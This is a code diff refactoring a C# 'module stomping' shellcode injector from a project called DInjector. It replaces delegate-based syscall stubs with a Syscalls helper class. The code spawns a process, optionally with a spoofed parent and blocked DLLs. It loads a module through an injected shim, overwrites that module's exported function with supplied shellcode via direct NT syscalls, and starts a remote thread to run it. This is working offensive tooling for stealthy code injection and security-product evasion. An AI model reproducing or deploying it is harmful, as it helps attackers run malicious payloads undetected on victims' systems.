@@ -15,67 +15,7 @@ namespace DInjector
     /// </summary>
     public class ModuleStomping
     {
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtAllocateVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            IntPtr ZeroBits,
-            ref IntPtr RegionSize,
-            uint AllocationType,
-            uint Protect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
-            IntPtr ProcessHandle,
-            IntPtr BaseAddress,
-            IntPtr Buffer,
-            uint BufferLength,
-            ref uint BytesWritten);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
-            IntPtr ProcessHandle,
-            ref IntPtr BaseAddress,
-            ref IntPtr RegionSize,
-            uint NewProtect,
-            out uint OldProtect);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtCreateThreadEx(
-            out IntPtr threadHandle,
-            DI.Data.Win32.WinNT.ACCESS_MASK desiredAccess,
-            IntPtr objectAttributes,
-            IntPtr processHandle,
-            IntPtr startAddress,
-            IntPtr parameter,
-            bool createSuspended,
-            int stackZeroBits,
-            int sizeOfStack,
-            int maximumStackSize,
-            IntPtr attributeList);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtWaitForSingleObject(
-            IntPtr ObjectHandle,
-            bool Alertable, uint Timeout);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtFreeVirtualMemory(
-            IntPtr processHandle,
-            ref IntPtr baseAddress,
-            ref IntPtr regionSize,
-            uint freeType);
-
-        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate bool CloseHandle(IntPtr hObject);
-
-        private static bool closeHandle(IntPtr hObject)
-        {
-            object[] parameters = { hObject };
-            return (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
-        }
-
-        private static byte[] GenerateShim(long loadLibraryExP)
+        static byte[] GenerateShim(long loadLibraryExP)
         {
             using var ms = new MemoryStream();
             using var bw = new BinaryWriter(ms);
@@ -91,10 +31,8 @@ namespace DInjector
             };
         }
 
-        public static void Execute(byte[] shellcodeBytes, string processImage, string moduleName, string exportName, int ppid = 0, bool blockDlls = false)
+        public static void Execute(byte[] shellcode, string processImage, string moduleName, string exportName, int ppid = 0, bool blockDlls = false)
         {
-            var shellcode = shellcodeBytes;
-
             #region CreateProcessA
 
             var pi = SpawnProcess.Execute(
@@ -118,15 +56,11 @@ namespace DInjector
 
             #region NtAllocateVirtualMemory (bModuleName, PAGE_READWRITE)
 
-            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtAllocateVirtualMemory");
-            NtAllocateVirtualMemory sysNtAllocateVirtualMemory = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtAllocateVirtualMemory));
-
             IntPtr hProcess = pi.hProcess;
             var allocModule = IntPtr.Zero;
             var regionSize = new IntPtr(bModuleName.Length + 2);
-            DI.Data.Native.NTSTATUS ntstatus;
 
-            ntstatus = sysNtAllocateVirtualMemory(
+            var ntstatus = Syscalls.NtAllocateVirtualMemory(
                 hProcess,
                 ref allocModule,
                 IntPtr.Zero,
@@ -146,7 +80,7 @@ namespace DInjector
             var allocShim = IntPtr.Zero;
             regionSize = new IntPtr(shim.Length);
 
-            ntstatus = sysNtAllocateVirtualMemory(
+            ntstatus = Syscalls.NtAllocateVirtualMemory(
                 hProcess,
                 ref allocShim,
                 IntPtr.Zero,
@@ -163,15 +97,12 @@ namespace DInjector
 
             #region NtWriteVirtualMemory (bModuleName)
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
-            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));
-
             var buffer = Marshal.AllocHGlobal(bModuleName.Length);
             Marshal.Copy(bModuleName, 0, buffer, bModuleName.Length);
 
             uint bytesWritten = 0;
 
-            ntstatus = sysNtWriteVirtualMemory(
+            ntstatus = Syscalls.NtWriteVirtualMemory(
                 hProcess,
                 allocModule,
                 buffer,
@@ -192,7 +123,9 @@ namespace DInjector
             buffer = Marshal.AllocHGlobal(shim.Length);
             Marshal.Copy(shim, 0, buffer, shim.Length);
 
-            ntstatus = sysNtWriteVirtualMemory(
+            bytesWritten = 0;
+
+            ntstatus = Syscalls.NtWriteVirtualMemory(
                 hProcess,
                 allocShim,
                 buffer,
@@ -210,18 +143,16 @@ namespace DInjector
 
             #region NtProtectVirtualMemory (shim, PAGE_EXECUTE_READ)
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
-            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));
-
             IntPtr protectAddress = allocShim;
             regionSize = new IntPtr(shim.Length);
+            uint oldProtect = 0;
 
-            ntstatus = sysNtProtectVirtualMemory(
+            ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                out uint _);
+                ref oldProtect);
 
             if (ntstatus == 0)
                 Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shim), PAGE_EXECUTE_READ");
@@ -232,13 +163,10 @@ namespace DInjector
 
             #region NtCreateThreadEx (shim)
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtCreateThreadEx");
-            NtCreateThreadEx sysNtCreateThreadEx = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtCreateThreadEx));
-
             IntPtr hThread = IntPtr.Zero;
 
-            ntstatus = sysNtCreateThreadEx(
-                out hThread,
+            ntstatus = Syscalls.NtCreateThreadEx(
+                ref hThread,
                 DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                 IntPtr.Zero,
                 hProcess,
@@ -259,10 +187,7 @@ namespace DInjector
 
             #region NtWaitForSingleObject
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWaitForSingleObject");
-            NtWaitForSingleObject sysNtWaitForSingleObject = (NtWaitForSingleObject)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWaitForSingleObject));
-
-            ntstatus = sysNtWaitForSingleObject(
+            ntstatus = Syscalls.NtWaitForSingleObject(
                 hThread,
                 false,
                 0);
@@ -276,12 +201,9 @@ namespace DInjector
 
             #region NtFreeVirtualMemory (allocModule)
 
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtFreeVirtualMemory");
-            NtFreeVirtualMemory sysNtFreeVirtualMemory = (NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtFreeVirtualMemory));
-
             regionSize = IntPtr.Zero;
 
-            ntstatus = sysNtFreeVirtualMemory(
+            ntstatus = Syscalls.NtFreeVirtualMemory(
                 hProcess,
                 ref allocModule,
                 ref regionSize,
@@ -298,7 +220,7 @@ namespace DInjector
 
             regionSize = IntPtr.Zero;
 
-            ntstatus = sysNtFreeVirtualMemory(
+            ntstatus = Syscalls.NtFreeVirtualMemory(
                 hProcess,
                 ref allocShim,
                 ref regionSize,
@@ -311,7 +233,7 @@ namespace DInjector
 
             #endregion
 
-            closeHandle(hThread);
+            Win32.CloseHandle(hThread);
 
             #region Find targetAddress
 
@@ -336,13 +258,14 @@ namespace DInjector
 
             protectAddress = targetAddress;
             regionSize = new IntPtr(shellcode.Length);
+            oldProtect = 0;
 
-            ntstatus = sysNtProtectVirtualMemory(
+            ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_READWRITE,
-                out uint _);
+                ref oldProtect);
 
             if (ntstatus == 0)
                 Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shellcode), PAGE_READWRITE");
@@ -356,7 +279,9 @@ namespace DInjector
             buffer = Marshal.AllocHGlobal(shellcode.Length);
             Marshal.Copy(shellcode, 0, buffer, shellcode.Length);
 
-            ntstatus = sysNtWriteVirtualMemory(
+            bytesWritten = 0;
+
+            ntstatus = Syscalls.NtWriteVirtualMemory(
                 hProcess,
                 targetAddress,
                 buffer,
@@ -375,13 +300,14 @@ namespace DInjector
             #region NtProtectVirtualMemory (shellcode, PAGE_EXECUTE_READ)
 
             protectAddress = targetAddress;
+            oldProtect = 0;
 
-            ntstatus = sysNtProtectVirtualMemory(
+            ntstatus = Syscalls.NtProtectVirtualMemory(
                 hProcess,
                 ref protectAddress,
                 ref regionSize,
                 DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
-                out uint _);
+                ref oldProtect);
 
             if (ntstatus == 0)
                 Console.WriteLine("(ModuleStomping) [+] NtProtectVirtualMemory (shellcode), PAGE_EXECUTE_READ");
@@ -394,8 +320,8 @@ namespace DInjector
 
             hThread = IntPtr.Zero;
 
-            ntstatus = sysNtCreateThreadEx(
-                out hThread,
+            ntstatus = Syscalls.NtCreateThreadEx(
+                ref hThread,
                 DI.Data.Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED,
                 IntPtr.Zero,
                 hProcess,
@@ -414,8 +340,8 @@ namespace DInjector
 
             #endregion
 
-            closeHandle(hThread);
-            closeHandle(hProcess);
+            Win32.CloseHandle(hThread);
+            Win32.CloseHandle(hProcess);
         }
     }
 }
